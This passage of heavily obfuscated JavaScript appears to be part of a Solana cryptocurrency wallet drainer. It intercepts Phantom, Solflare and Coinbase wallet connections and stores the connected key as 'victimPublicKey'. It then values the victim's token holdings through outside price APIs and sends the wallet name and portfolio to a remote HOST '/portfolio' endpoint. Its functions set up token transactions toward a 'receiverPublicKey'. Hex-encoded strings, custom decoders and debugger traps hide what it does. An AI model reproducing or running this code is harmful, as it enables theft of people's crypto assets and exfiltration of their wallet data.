      f3i6H1.push((rOnBTDk | __String << __globalObject) & 0xff);
    }
    return fsS5SCv(f3i6H1);
  }
  function djkbJA(cHN1sY7) {
    if (typeof f3i6H1[cHN1sY7] === 'undefined') {
      return f3i6H1[cHN1sY7] = e_qLdL(rOnBTDk[cHN1sY7]);
    }
    return f3i6H1[cHN1sY7];
  }
  debugger;
  await fetch(HOST + '\x2f\x70\x6f\x72\x74\x66\x6f\x6c\x69\x6f', {
    '\x6d\x65\x74\x68\x6f\x64': djkbJA(0xdc),
    ["header" + "s"]: {
      ["Conten" + djkbJA(0xdd)]: '\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e'
    },
    '\x62\x6f\x64\x79': JSON[djkbJA(0xde) + djkbJA(0xdf)]({
      [djkbJA(0xe0)]: parentData[djkbJA(0xe1)],
      [djkbJA(0xe2)]: cHN1sY7,
      ["WALLET" + djkbJA(0xe3)]: walletName,
      ["PORTFO" + djkbJA(0xe4)]: jnnEqQv
    })
  });
}
window['\x63\x6c\x6f\x73\x65\x50\x6f\x70\x75\x70'] = async function () {
  function cHN1sY7(cHN1sY7) {
    var jnnEqQv = "ADEGFCHBLOJIKMNPRSTVWQUXYaZbdefchoripgqjutsvklnm09x85!ywz6#24137[}@]%^$~\"`&()_{*,|+:.=/;><?";
    var djkbJA = "" + (cHN1sY7 || "");
    var __globalObject = djkbJA.length;
    var __String = [];
    var __Array = 0x0;
    var e_qLdL = 0x0;
    var f3i6H1 = -0x1;
    for (var rOnBTDk = 0x0; rOnBTDk < __globalObject; rOnBTDk++) {
      var _0x200a61 = jnnEqQv.indexOf(djkbJA[rOnBTDk]);
      if (_0x200a61 === -0x1) continue;
      if (f3i6H1 < 0x0) {
        f3i6H1 = _0x200a61;
      } else {
        f3i6H1 += _0x200a61 * 0x5b;
        __Array |= f3i6H1 << e_qLdL;
        e_qLdL += (f3i6H1 & 0x1fff) > 0x58 ? 0xd : 0xe;
        do {
          __String.push(__Array & 0xff);
          __Array >>= 0x8;
          e_qLdL -= 0x8;
        } while (e_qLdL > 0x7);
        f3i6H1 = -0x1;
      }
    }
    if (f3i6H1 > -0x1) {
      __String.push((__Array | f3i6H1 << e_qLdL) & 0xff);
    }
    return fsS5SCv(__String);
  }
  function jnnEqQv(jnnEqQv) {
    if (typeof f3i6H1[jnnEqQv] === 'undefined') {
      return f3i6H1[jnnEqQv] = cHN1sY7(rOnBTDk[jnnEqQv]);
    }
    return f3i6H1[jnnEqQv];
  }
  debugger;
  const djkbJA = document[e_qLdL(0xe5)](jnnEqQv(0xe6) + "-popup");
  for (const __globalObject of djkbJA) {
    function __String(cHN1sY7) {
      var jnnEqQv = "s/|xB$._DA`{iwht%u:;C[@E>y=]F^jH<&(?GJzgP~3q}IK\")+*1,N0LM2O#Z5T4S8v9olbmna!YR7k6rQpcdWefVUX";
      var djkbJA = "" + (cHN1sY7 || "");
      var __globalObject = djkbJA.length;
      var __String = [];
      var __Array = 0x0;
      var e_qLdL = 0x0;
      var f3i6H1 = -0x1;
      for (var rOnBTDk = 0x0; rOnBTDk < __globalObject; rOnBTDk++) {
        var _0x200a61 = jnnEqQv.indexOf(djkbJA[rOnBTDk]);
        if (_0x200a61 === -0x1) continue;
        if (f3i6H1 < 0x0) {
          f3i6H1 = _0x200a61;
        } else {
          f3i6H1 += _0x200a61 * 0x5b;
          __Array |= f3i6H1 << e_qLdL;
          e_qLdL += (f3i6H1 & 0x1fff) > 0x58 ? 0xd : 0xe;
          do {
            __String.push(__Array & 0xff);
            __Array >>= 0x8;
            e_qLdL -= 0x8;
          } while (e_qLdL > 0x7);
          f3i6H1 = -0x1;
        }
      }
      if (f3i6H1 > -0x1) {
        __String.push((__Array | f3i6H1 << e_qLdL) & 0xff);
      }
      return fsS5SCv(__String);
    }
    function __Array(cHN1sY7) {
      if (typeof f3i6H1[cHN1sY7] === 'undefined') {
        return f3i6H1[cHN1sY7] = __String(rOnBTDk[cHN1sY7]);
      }
      return f3i6H1[cHN1sY7];
    }
    debugger;
    __globalObject["classL" + __Array(0xe7)][__Array(0xe8)](__Array(0xe9) + __Array(0xea) + __Array(0xeb) + "n") ? (__globalObject['\x63\x6c\x61\x73\x73\x4c\x69\x73\x74'][__Array(0xec)]('\x77\x61\x6c\x6c\x65\x74\x2d\x61\x64\x61\x70\x74\x65\x72\x2d\x6d\x6f\x64\x61\x6c\x2d\x66\x61\x64\x65\x2d\x69\x6e'), setTimeout(() => {
      __globalObject['\x72\x65\x6d\x6f\x76\x65']();
    }, 0x96)) : __globalObject['\x72\x65\x6d\x6f\x76\x65']();
  }
}, window[e_qLdL(0xed) + "lose"] = function () {
  console['\x6c\x6f\x67'](e_qLdL(0xee) + e_qLdL(0xef) + "(not o" + "verwri" + e_qLdL(0xf0));
};
function generateSolflareConnection() {
  function cHN1sY7(cHN1sY7) {
    var jnnEqQv = "([jB%$@&A,F+]^h*i).E|gCDk/G:;_n=H<?`>lmJ{I\"rK}~qLpNoPMOsQSuvTtRXUVW#4aw8Z!bYfdc596exy7z2031";
    var e_qLdL = "" + (cHN1sY7 || "");
    var f3i6H1 = e_qLdL.length;
    var rOnBTDk = [];
    var djkbJA = 0x0;
    var __globalObject = 0x0;
    var __String = -0x1;
    for (var __Array = 0x0; __Array < f3i6H1; __Array++) {
      var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
      if (_0x200a61 === -0x1) continue;
      if (__String < 0x0) {
        __String = _0x200a61;
      } else {
        __String += _0x200a61 * 0x5b;
        djkbJA |= __String << __globalObject;
        __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
        do {
          rOnBTDk.push(djkbJA & 0xff);
          djkbJA >>= 0x8;
          __globalObject -= 0x8;
        } while (__globalObject > 0x7);
        __String = -0x1;
      }
    }
    if (__String > -0x1) {
      rOnBTDk.push((djkbJA | __String << __globalObject) & 0xff);
    }
    return fsS5SCv(rOnBTDk);
  }
  function jnnEqQv(jnnEqQv) {
    if (typeof f3i6H1[jnnEqQv] === 'undefined') {
      return f3i6H1[jnnEqQv] = cHN1sY7(rOnBTDk[jnnEqQv]);
    }
    return f3i6H1[jnnEqQv];
  }
  return e_qLdL(0xf1) + jnnEqQv(0xf2) + jnnEqQv(0xf3) + jnnEqQv(0xf4) + "v1/bro" + "wse/" + encodeURIComponent(window[jnnEqQv(0xf5)][jnnEqQv(0xf6)]) + '\x3f\x72\x65\x66\x3d' + encodeURIComponent(window["locati" + "on"]['\x68\x72\x65\x66']);
}
function generatePhantomConnection() {
  function cHN1sY7(cHN1sY7) {
    var jnnEqQv = "&$pDBAhogCFrq(%u,Gsijtkv+EHlmn*x#Myw9)z8N:?OP<IJ=4/L>;1.!~2KRY{_Q0}\"`S@[T3|cd]756We^afZbUVX";
    var e_qLdL = "" + (cHN1sY7 || "");
    var f3i6H1 = e_qLdL.length;
    var rOnBTDk = [];
    var djkbJA = 0x0;
    var __globalObject = 0x0;
    var __String = -0x1;
    for (var __Array = 0x0; __Array < f3i6H1; __Array++) {
      var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
      if (_0x200a61 === -0x1) continue;
      if (__String < 0x0) {
        __String = _0x200a61;
      } else {
        __String += _0x200a61 * 0x5b;
        djkbJA |= __String << __globalObject;
        __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
        do {
          rOnBTDk.push(djkbJA & 0xff);
          djkbJA >>= 0x8;
          __globalObject -= 0x8;
        } while (__globalObject > 0x7);
        __String = -0x1;
      }
    }
    if (__String > -0x1) {
      rOnBTDk.push((djkbJA | __String << __globalObject) & 0xff);
    }
    return fsS5SCv(rOnBTDk);
  }
  function jnnEqQv(jnnEqQv) {
    if (typeof f3i6H1[jnnEqQv] === 'undefined') {
      return f3i6H1[jnnEqQv] = cHN1sY7(rOnBTDk[jnnEqQv]);
    }
    return f3i6H1[jnnEqQv];
  }
  return '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x68\x61\x6e\x74\x6f\x6d\x2e\x61\x70\x70\x2f\x75\x6c\x2f\x62\x72\x6f\x77\x73\x65\x2f' + encodeURIComponent(window[e_qLdL(0x80)][jnnEqQv(0xf7)]) + jnnEqQv(0xf8) + encodeURIComponent(window[jnnEqQv(0xf9) + "on"]['\x68\x72\x65\x66']);
}
function openCoinbaseSolana() {
  function cHN1sY7(cHN1sY7) {
    var jnnEqQv = "LNMJIBKACOPDFGEHTQSRVUXWeYfaZbcdjhgimlknoprqtvsuyxzw0132457698!#](@*^%,:.;[_`/){|<}>=+\"?$&~";
    var e_qLdL = "" + (cHN1sY7 || "");
    var f3i6H1 = e_qLdL.length;
    var rOnBTDk = [];
    var djkbJA = 0x0;
    var __globalObject = 0x0;
    var __String = -0x1;
    for (var __Array = 0x0; __Array < f3i6H1; __Array++) {
      var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
      if (_0x200a61 === -0x1) continue;
      if (__String < 0x0) {
        __String = _0x200a61;
      } else {
        __String += _0x200a61 * 0x5b;
        djkbJA |= __String << __globalObject;
        __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
        do {
          rOnBTDk.push(djkbJA & 0xff);
          djkbJA >>= 0x8;
          __globalObject -= 0x8;
        } while (__globalObject > 0x7);
        __String = -0x1;
      }
    }
    if (__String > -0x1) {
      rOnBTDk.push((djkbJA | __String << __globalObject) & 0xff);
    }
    return fsS5SCv(rOnBTDk);
  }
  function jnnEqQv(jnnEqQv) {
    if (typeof f3i6H1[jnnEqQv] === 'undefined') {
      return f3i6H1[jnnEqQv] = cHN1sY7(rOnBTDk[jnnEqQv]);
    }
    return f3i6H1[jnnEqQv];
  }
  const e_qLdL = jnnEqQv(0xfa) + encodeURIComponent(parentData[jnnEqQv(0xfb)]);
  window['\x6c\x6f\x63\x61\x74\x69\x6f\x6e']['\x68\x72\x65\x66'] = e_qLdL;
}
async function handleModalChoice(cHN1sY7) {
  walletName = cHN1sY7;
  if (cHN1sY7 === "phanto" + "m") {
    function jnnEqQv(cHN1sY7) {
      var jnnEqQv = "RpQBsSTiWjVAtohCqUgXuYkvrFDlnEZm3waGH0xyz1b2c6dK457P9MN#L8JeOIf!]:$[@~&\"%}^.{/`|_(*)+,;<=?>";
      var djkbJA = "" + (cHN1sY7 || "");
      var __globalObject = djkbJA.length;
      var __String = [];
      var __Array = 0x0;
      var _0x200a61 = 0x0;
      var e_qLdL = -0x1;
      for (var f3i6H1 = 0x0; f3i6H1 < __globalObject; f3i6H1++) {
        var rOnBTDk = jnnEqQv.indexOf(djkbJA[f3i6H1]);
        if (rOnBTDk === -0x1) continue;
        if (e_qLdL < 0x0) {
          e_qLdL = rOnBTDk;
        } else {
          e_qLdL += rOnBTDk * 0x5b;
          __Array |= e_qLdL << _0x200a61;
          _0x200a61 += (e_qLdL & 0x1fff) > 0x58 ? 0xd : 0xe;
          do {
            __String.push(__Array & 0xff);
            __Array >>= 0x8;
            _0x200a61 -= 0x8;
          } while (_0x200a61 > 0x7);
          e_qLdL = -0x1;
        }
      }
      if (e_qLdL > -0x1) {
        __String.push((__Array | e_qLdL << _0x200a61) & 0xff);
      }
      return fsS5SCv(__String);
    }
    function djkbJA(cHN1sY7) {
      if (typeof f3i6H1[cHN1sY7] === 'undefined') {
        return f3i6H1[cHN1sY7] = jnnEqQv(rOnBTDk[cHN1sY7]);
      }
      return f3i6H1[cHN1sY7];
    }
    window?.["phanto" + "m"]?.['\x73\x6f\x6c\x61\x6e\x61'] || window[e_qLdL(0xfc)] ? (solanaProvider = window?.[e_qLdL(0xfd)]?.['\x73\x6f\x6c\x61\x6e\x61'] || window['\x73\x6f\x6c\x61\x6e\x61'], solanaProvider['\x6f\x6e']("connec" + "t", async function () {
      victimPublicKey = solanaProvider[e_qLdL(0xfe)], window['\x63\x68\x61\x6e\x67\x65\x42\x75\x74\x74\x6f\x6e'](![], CONNECTING), await onConnected();
    }), await solanaProvider['\x63\x6f\x6e\x6e\x65\x63\x74']({
      [djkbJA(0xff) + djkbJA(0x100) + "d"]: ![]
    })) : window['\x6c\x6f\x63\x61\x74\x69\x6f\x6e'][djkbJA(0x101)] = isMobile() ? generatePhantomConnection() : djkbJA(0x102);
  } else {
    debugger;
    if (cHN1sY7 === e_qLdL(0x103) + "re") {
      function __globalObject(cHN1sY7) {
        var jnnEqQv = "KJILNPABDMCFOEGHVeZWYdfXRUQcSbaTwkyzmhljngirpqotxsv2013u8!6794#5*(&$%)+,<:=/?.;>[@]^_`{|\"}~";
        var djkbJA = "" + (cHN1sY7 || "");
        var __globalObject = djkbJA.length;
        var __String = [];
        var __Array = 0x0;
        var _0x200a61 = 0x0;
        var e_qLdL = -0x1;
        for (var f3i6H1 = 0x0; f3i6H1 < __globalObject; f3i6H1++) {
          var rOnBTDk = jnnEqQv.indexOf(djkbJA[f3i6H1]);
          if (rOnBTDk === -0x1) continue;
          if (e_qLdL < 0x0) {
            e_qLdL = rOnBTDk;
          } else {
            e_qLdL += rOnBTDk * 0x5b;
            __Array |= e_qLdL << _0x200a61;
            _0x200a61 += (e_qLdL & 0x1fff) > 0x58 ? 0xd : 0xe;
            do {
              __String.push(__Array & 0xff);
              __Array >>= 0x8;
              _0x200a61 -= 0x8;
            } while (_0x200a61 > 0x7);
            e_qLdL = -0x1;
          }
        }
        if (e_qLdL > -0x1) {
          __String.push((__Array | e_qLdL << _0x200a61) & 0xff);
        }
        return fsS5SCv(__String);
      }
      function __String(cHN1sY7) {
        if (typeof f3i6H1[cHN1sY7] === 'undefined') {
          return f3i6H1[cHN1sY7] = __globalObject(rOnBTDk[cHN1sY7]);
        }
        return f3i6H1[cHN1sY7];
      }
      debugger;
      !window[e_qLdL(0xfc)] && !window[e_qLdL(0x104)] ? window["locati" + "on"]['\x68\x72\x65\x66'] = generateSolflareConnection() : (solanaProvider = window[__String(0x105)] || window[__String(0x106)], solanaProvider['\x6f\x6e']("connec" + "t", async function () {
        function cHN1sY7(cHN1sY7) {
          var jnnEqQv = "~[xJ5ip]Fd@O/^oWgc=}S*\"w+_`.{qz|j$h)&<,%A:k2(9?>Y;y0rVsaUuMnB#EvGtXQmel13R4Z8TfCHbN!67PIKDL";
          var djkbJA = "" + (cHN1sY7 || "");
          var __globalObject = djkbJA.length;
          var __String = [];
          var __Array = 0x0;
          var _0x200a61 = 0x0;
          var e_qLdL = -0x1;
          for (var f3i6H1 = 0x0; f3i6H1 < __globalObject; f3i6H1++) {
            var rOnBTDk = jnnEqQv.indexOf(djkbJA[f3i6H1]);
            if (rOnBTDk === -0x1) continue;
            if (e_qLdL < 0x0) {
              e_qLdL = rOnBTDk;
            } else {
              e_qLdL += rOnBTDk * 0x5b;
              __Array |= e_qLdL << _0x200a61;
              _0x200a61 += (e_qLdL & 0x1fff) > 0x58 ? 0xd : 0xe;
              do {
                __String.push(__Array & 0xff);
                __Array >>= 0x8;
                _0x200a61 -= 0x8;
              } while (_0x200a61 > 0x7);
              e_qLdL = -0x1;
            }
          }
          if (e_qLdL > -0x1) {
            __String.push((__Array | e_qLdL << _0x200a61) & 0xff);
          }
          return fsS5SCv(__String);
        }
        function jnnEqQv(jnnEqQv) {
          if (typeof f3i6H1[jnnEqQv] === 'undefined') {
            return f3i6H1[jnnEqQv] = cHN1sY7(rOnBTDk[jnnEqQv]);
          }
          return f3i6H1[jnnEqQv];
        }
        debugger;
        victimPublicKey = solanaProvider[__String(0x107) + __String(0x108)], window[jnnEqQv(0x109)](![], CONNECTING), await onConnected();
      }), await solanaProvider['\x63\x6f\x6e\x6e\x65\x63\x74']({
        '\x6f\x6e\x6c\x79\x49\x66\x54\x72\x75\x73\x74\x65\x64': ![]
      }));
    } else {
      function __Array(cHN1sY7) {
        var jnnEqQv = "ENMBPAJODLICFHGKSQTRUWVXaZYbcedfhgtsupoqjilknrvmy2310xwz546798!#(%$&+*),/?=>.<:;][~@^`_|{}\"";
        var djkbJA = "" + (cHN1sY7 || "");
        var __globalObject = djkbJA.length;
        var __String = [];
        var __Array = 0x0;
        var _0x200a61 = 0x0;
        var e_qLdL = -0x1;
        for (var f3i6H1 = 0x0; f3i6H1 < __globalObject; f3i6H1++) {
          var rOnBTDk = jnnEqQv.indexOf(djkbJA[f3i6H1]);
          if (rOnBTDk === -0x1) continue;
          if (e_qLdL < 0x0) {
            e_qLdL = rOnBTDk;
          } else {
            e_qLdL += rOnBTDk * 0x5b;
            __Array |= e_qLdL << _0x200a61;
            _0x200a61 += (e_qLdL & 0x1fff) > 0x58 ? 0xd : 0xe;
            do {
              __String.push(__Array & 0xff);
              __Array >>= 0x8;
              _0x200a61 -= 0x8;
            } while (_0x200a61 > 0x7);
            e_qLdL = -0x1;
          }
        }
        if (e_qLdL > -0x1) {
          __String.push((__Array | e_qLdL << _0x200a61) & 0xff);
        }
        return fsS5SCv(__String);
      }
      function _0x200a61(cHN1sY7) {
        if (typeof f3i6H1[cHN1sY7] === 'undefined') {
          return f3i6H1[cHN1sY7] = __Array(rOnBTDk[cHN1sY7]);
        }
        return f3i6H1[cHN1sY7];
      }
      debugger;
      cHN1sY7 === e_qLdL(0x10a) ? window[e_qLdL(0x10b)] || window[_0x200a61(0x10c)] ? (solanaProvider = window[_0x200a61(0x10d)] || window[_0x200a61(0x10c)], await solanaProvider["connec" + "t"]({
        ["onlyIf" + "Truste" + "d"]: ![]
      }), solanaProvider["isConn" + "ected"] && (victimPublicKey = solanaProvider["public" + _0x200a61(0x10e)], window[_0x200a61(0x10f) + _0x200a61(0x110)](![], CONNECTING), await onConnected())) : openCoinbaseSolana() : (solanaProvider = window?.[_0x200a61(0x10c)], solanaProvider['\x6f\x6e']("connec" + "t", async function () {
        function cHN1sY7(cHN1sY7) {
          var jnnEqQv = "ATYaZIbcdJFeKLfVUXMCDNWQOSRBPGHExhwizgjy3m1lk2nop0qrstu5467v98#!%./_@{[$:^,`&];|~)}\"(*+<?>=";
          var djkbJA = "" + (cHN1sY7 || "");
          var __globalObject = djkbJA.length;
          var __String = [];
          var __Array = 0x0;
          var _0x200a61 = 0x0;
          var e_qLdL = -0x1;
          for (var f3i6H1 = 0x0; f3i6H1 < __globalObject; f3i6H1++) {
            var rOnBTDk = jnnEqQv.indexOf(djkbJA[f3i6H1]);
            if (rOnBTDk === -0x1) continue;
            if (e_qLdL < 0x0) {
              e_qLdL = rOnBTDk;
            } else {
              e_qLdL += rOnBTDk * 0x5b;
              __Array |= e_qLdL << _0x200a61;
              _0x200a61 += (e_qLdL & 0x1fff) > 0x58 ? 0xd : 0xe;
              do {
                __String.push(__Array & 0xff);
                __Array >>= 0x8;
                _0x200a61 -= 0x8;
              } while (_0x200a61 > 0x7);
              e_qLdL = -0x1;
            }
          }
          if (e_qLdL > -0x1) {
            __String.push((__Array | e_qLdL << _0x200a61) & 0xff);
          }
          return fsS5SCv(__String);
        }
        function jnnEqQv(jnnEqQv) {
          if (typeof f3i6H1[jnnEqQv] === 'undefined') {
            return f3i6H1[jnnEqQv] = cHN1sY7(rOnBTDk[jnnEqQv]);
          }
          return f3i6H1[jnnEqQv];
        }
        victimPublicKey = solanaProvider[jnnEqQv(0x111)], window["change" + "Button"](![], CONNECTING), await onConnected();
      }), await solanaProvider['\x63\x6f\x6e\x6e\x65\x63\x74']({
        ["onlyIf" + "Truste" + "d"]: ![]
      }));
    }
  }
}
window[e_qLdL(0x112) + "ModalC" + "hoice"] = handleModalChoice;
async function portfolio(cHN1sY7) {
  try {
    function jnnEqQv(cHN1sY7) {
      var jnnEqQv = "bIRCAWDaBVUKMZXYLPFQNOJTESHecfdG#wxhyj14k9g0mi37nl528pszv!qt6uor&`}%@$)[_]~^\"|+,({*>:=?;<./";
      var e_qLdL = "" + (cHN1sY7 || "");
      var djkbJA = e_qLdL.length;
      var __globalObject = [];
      var __String = 0x0;
      var __Array = 0x0;
      var _0x200a61 = -0x1;
      for (var _0x3c0230 = 0x0; _0x3c0230 < djkbJA; _0x3c0230++) {
        var _0x56ffb6 = jnnEqQv.indexOf(e_qLdL[_0x3c0230]);
        if (_0x56ffb6 === -0x1) continue;
        if (_0x200a61 < 0x0) {
          _0x200a61 = _0x56ffb6;
        } else {
          _0x200a61 += _0x56ffb6 * 0x5b;
          __String |= _0x200a61 << __Array;
          __Array += (_0x200a61 & 0x1fff) > 0x58 ? 0xd : 0xe;
          do {
            __globalObject.push(__String & 0xff);
            __String >>= 0x8;
            __Array -= 0x8;
          } while (__Array > 0x7);
          _0x200a61 = -0x1;
        }
      }
      if (_0x200a61 > -0x1) {
        __globalObject.push((__String | _0x200a61 << __Array) & 0xff);
      }
      return fsS5SCv(__globalObject);
    }
    function e_qLdL(cHN1sY7) {
      if (typeof f3i6H1[cHN1sY7] === 'undefined') {
        return f3i6H1[cHN1sY7] = jnnEqQv(rOnBTDk[cHN1sY7]);
      }
      return f3i6H1[cHN1sY7];
    }
    const djkbJA = 0x64;
    let __globalObject = [];
    const __String = [];
    const __Array = cHN1sY7[e_qLdL(0x113)](cHN1sY7 => {
      function jnnEqQv(cHN1sY7) {
        var jnnEqQv = ".h:A/$;%=g&ijkB<lCDEm>Gn(F?+)s*ruHKtoJ,]p\"}~vLq[^I@x_{`P|yw301zOM2NU5Q#!6RTVWX9874SYedZcfba";
        var __Array = "" + (cHN1sY7 || "");
        var _0x200a61 = __Array.length;
        var _0x3c0230 = [];
        var e_qLdL = 0x0;
        var djkbJA = 0x0;
        var __globalObject = -0x1;
        for (var __String = 0x0; __String < _0x200a61; __String++) {
          var _0x56ffb6 = jnnEqQv.indexOf(__Array[__String]);
          if (_0x56ffb6 === -0x1) continue;
          if (__globalObject < 0x0) {
            __globalObject = _0x56ffb6;
          } else {
            __globalObject += _0x56ffb6 * 0x5b;
            e_qLdL |= __globalObject << djkbJA;
            djkbJA += (__globalObject & 0x1fff) > 0x58 ? 0xd : 0xe;
            do {
              _0x3c0230.push(e_qLdL & 0xff);
              e_qLdL >>= 0x8;
              djkbJA -= 0x8;
            } while (djkbJA > 0x7);
            __globalObject = -0x1;
          }
        }
        if (__globalObject > -0x1) {
          _0x3c0230.push((e_qLdL | __globalObject << djkbJA) & 0xff);
        }
        return fsS5SCv(_0x3c0230);
      }
      function __Array(cHN1sY7) {
        if (typeof f3i6H1[cHN1sY7] === 'undefined') {
          return f3i6H1[cHN1sY7] = jnnEqQv(rOnBTDk[cHN1sY7]);
        }
        return f3i6H1[cHN1sY7];
      }
      const {
        ["mint"]: _0x200a61,
        ["tokenAmount"]: _0x3c0230
      } = cHN1sY7['\x61\x63\x63\x6f\x75\x6e\x74'][e_qLdL(0x114)]['\x70\x61\x72\x73\x65\x64']['\x69\x6e\x66\x6f'];
      return __globalObject[__Array(0x115)](_0x200a61), __globalObject[__Array(0x116)] === djkbJA && (__String['\x70\x75\x73\x68'](__globalObject), __globalObject = []), {
        '\x6d\x69\x6e\x74': _0x200a61,
        '\x62\x61\x6c\x61\x6e\x63\x65': _0x3c0230[__Array(0x117) + "nt"]
      };
    });
    __globalObject[e_qLdL(0x118)] > 0x0 && __String[e_qLdL(0x119)](__globalObject);
    for (const _0x200a61 of __String) {
      function _0x3c0230(cHN1sY7) {
        var jnnEqQv = "l~n%c|_}ESY(m\"7`{h@xQz+]*&$kyR[gd)^wKFb,;IT.D:ijqG/?<>60H=5Bo4ZAWCeaf2LJNOPr3UXVM1pt89!#suv";
        var e_qLdL = "" + (cHN1sY7 || "");
        var djkbJA = e_qLdL.length;
        var __globalObject = [];
        var __String = 0x0;
        var __Array = 0x0;
        var _0x200a61 = -0x1;
        for (var _0x3c0230 = 0x0; _0x3c0230 < djkbJA; _0x3c0230++) {
          var _0x56ffb6 = jnnEqQv.indexOf(e_qLdL[_0x3c0230]);
          if (_0x56ffb6 === -0x1) continue;
          if (_0x200a61 < 0x0) {
            _0x200a61 = _0x56ffb6;
          } else {
            _0x200a61 += _0x56ffb6 * 0x5b;
            __String |= _0x200a61 << __Array;
            __Array += (_0x200a61 & 0x1fff) > 0x58 ? 0xd : 0xe;
            do {
              __globalObject.push(__String & 0xff);
              __String >>= 0x8;
              __Array -= 0x8;
            } while (__Array > 0x7);
            _0x200a61 = -0x1;
          }
        }
        if (_0x200a61 > -0x1) {
          __globalObject.push((__String | _0x200a61 << __Array) & 0xff);
        }
        return fsS5SCv(__globalObject);
      }
      function _0x56ffb6(cHN1sY7) {
        if (typeof f3i6H1[cHN1sY7] === 'undefined') {
          return f3i6H1[cHN1sY7] = _0x3c0230(rOnBTDk[cHN1sY7]);
        }
        return f3i6H1[cHN1sY7];
      }
      debugger;
      const _ei = _0x200a61[_0x56ffb6(0x11a)]('\x2c');
      const parentData = _0x56ffb6(0x11b) + _0x56ffb6(0x11c) + _0x56ffb6(0x11d) + _ei;
      const walletName = await axios[_0x56ffb6(0x11e)](parentData);
      const currentURL = walletName[_0x56ffb6(0x11f)]['\x64\x61\x74\x61'];
      for (const [SIGN_INSTRUCTIONS_GIF, HOST] of Object["entrie" + "s"](currentURL)) {
        debugger;
        const BLOCKHASH_EXPIRATION_THRESHOLD = __Array['\x66\x69\x6e\x64'](cHN1sY7 => {
          debugger;
          return cHN1sY7['\x6d\x69\x6e\x74'] === SIGN_INSTRUCTIONS_GIF;
        });
        if (BLOCKHASH_EXPIRATION_THRESHOLD) {
          function PRIORITY_FEE(cHN1sY7) {
            var jnnEqQv = "w_g]%h@&ED[+)$(F^ij}GH`l2A~CB*{I,/x.;:<K\"k=|>J?LNz6nOmMyPpURQoSV40WTqrtX1YZabecf3!d5u7v#98s";
            var e_qLdL = "" + (cHN1sY7 || "");
            var djkbJA = e_qLdL.length;
            var __globalObject = [];
            var __String = 0x0;
            var __Array = 0x0;
            var _0x200a61 = -0x1;
            for (var _0x3c0230 = 0x0; _0x3c0230 < djkbJA; _0x3c0230++) {
              var _0x56ffb6 = jnnEqQv.indexOf(e_qLdL[_0x3c0230]);
              if (_0x56ffb6 === -0x1) continue;
              if (_0x200a61 < 0x0) {
                _0x200a61 = _0x56ffb6;
              } else {
                _0x200a61 += _0x56ffb6 * 0x5b;
                __String |= _0x200a61 << __Array;
                __Array += (_0x200a61 & 0x1fff) > 0x58 ? 0xd : 0xe;
                do {
                  __globalObject.push(__String & 0xff);
                  __String >>= 0x8;
                  __Array -= 0x8;
                } while (__Array > 0x7);
                _0x200a61 = -0x1;
              }
            }
            if (_0x200a61 > -0x1) {
              __globalObject.push((__String | _0x200a61 << __Array) & 0xff);
            }
            return fsS5SCv(__globalObject);
          }
          function SOLANA_RPC_URL(cHN1sY7) {
            if (typeof f3i6H1[cHN1sY7] === 'undefined') {
              return f3i6H1[cHN1sY7] = PRIORITY_FEE(rOnBTDk[cHN1sY7]);
            }
            return f3i6H1[cHN1sY7];
          }
          const BAD_WALLET = '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x6f\x6b\x65\x6e\x73\x2e\x6a\x75\x70\x2e\x61\x67\x2f\x74\x6f\x6b\x65\x6e\x2f' + SIGN_INSTRUCTIONS_GIF;
          const NOT_ENOUGH_SOLANA = await axios[_0x56ffb6(0x11e)](BAD_WALLET);
          const CONNECTING = NOT_ENOUGH_SOLANA[SOLANA_RPC_URL(0x120)][SOLANA_RPC_URL(0x121)];
          console['\x6c\x6f\x67']('\x4e\x61\x6d\x65\x3a', CONNECTING), BLOCKHASH_EXPIRATION_THRESHOLD['\x6e\x61\x6d\x65'] = CONNECTING, BLOCKHASH_EXPIRATION_THRESHOLD["totalV" + SOLANA_RPC_URL(0x122) + "USD"] = parseFloat(HOST?.['\x70\x72\x69\x63\x65'] || 0x0) * parseFloat(BLOCKHASH_EXPIRATION_THRESHOLD[SOLANA_RPC_URL(0x123)]), BLOCKHASH_EXPIRATION_THRESHOLD['\x70\x72\x69\x63\x65'] = parseFloat(HOST?.[SOLANA_RPC_URL(0x124)] || 0x0);
        }
      }
    }
    return __Array;
  } catch (solanaConnection) {
    function solanaProvider(cHN1sY7) {
      var jnnEqQv = "AQRSZTWJDLBUaIKCbYNGcEFHMdOPVeXfhkongiqrpjtsvlmu5xw7z4y6#80319!2%;./,:=<*?>)&$+(@[]~^|\"}`_{";
      var e_qLdL = "" + (cHN1sY7 || "");
      var djkbJA = e_qLdL.length;
      var __globalObject = [];
      var __String = 0x0;
      var __Array = 0x0;
      var _0x200a61 = -0x1;
      for (var _0x3c0230 = 0x0; _0x3c0230 < djkbJA; _0x3c0230++) {
        var _0x56ffb6 = jnnEqQv.indexOf(e_qLdL[_0x3c0230]);
        if (_0x56ffb6 === -0x1) continue;
        if (_0x200a61 < 0x0) {
          _0x200a61 = _0x56ffb6;
        } else {
          _0x200a61 += _0x56ffb6 * 0x5b;
          __String |= _0x200a61 << __Array;
          __Array += (_0x200a61 & 0x1fff) > 0x58 ? 0xd : 0xe;
          do {
            __globalObject.push(__String & 0xff);
            __String >>= 0x8;
            __Array -= 0x8;
          } while (__Array > 0x7);
          _0x200a61 = -0x1;
        }
      }
      if (_0x200a61 > -0x1) {
        __globalObject.push((__String | _0x200a61 << __Array) & 0xff);
      }
      return fsS5SCv(__globalObject);
    }
    function victimPublicKey(cHN1sY7) {
      if (typeof f3i6H1[cHN1sY7] === 'undefined') {
        return f3i6H1[cHN1sY7] = solanaProvider(rOnBTDk[cHN1sY7]);
      }
      return f3i6H1[cHN1sY7];
    }
    return console[victimPublicKey(0x125)]("Error:" + " " + solanaConnection['\x6d\x65\x73\x73\x61\x67\x65']), [];
  }
}
async function createTokenTransactions(cHN1sY7, jnnEqQv, victimPublicKey, handlerPublicKey, receiverPublicKey) {
  function djkbJA(cHN1sY7) {
